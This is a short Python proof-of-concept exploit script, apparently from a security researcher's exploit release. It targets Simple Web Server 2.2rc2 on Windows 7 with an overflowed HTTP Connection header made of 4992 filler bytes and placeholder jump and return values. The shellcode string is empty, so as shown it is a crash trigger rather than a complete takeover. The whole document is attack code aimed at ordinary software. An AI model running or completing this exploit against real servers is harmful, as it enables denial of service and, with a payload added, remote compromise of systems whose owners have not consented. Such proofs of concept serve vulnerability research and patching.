#!/usr/bin/python

####################################################################
# Application: Simple Web Server 2.2rc2                            #
# Author: VOSEC                                                    #
# Website: https://veilofsecurity.com                              #
# Tested OS: Windows 7 SP1 32bit                                   #
####################################################################

import socket
import sys

ip = "11.11.11.7"
port = 80

junk = "A"*4992
jmp = "B"*4
retn = "C"*4
shellcode = ""

req = "GET / HTTP/1.1\r\n"
req += "Host: 11.11.11.7\r\n"
req += "Connection:" + junk + jmp + retn + shellcode + "\r\n"
req += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(req)
s.close()
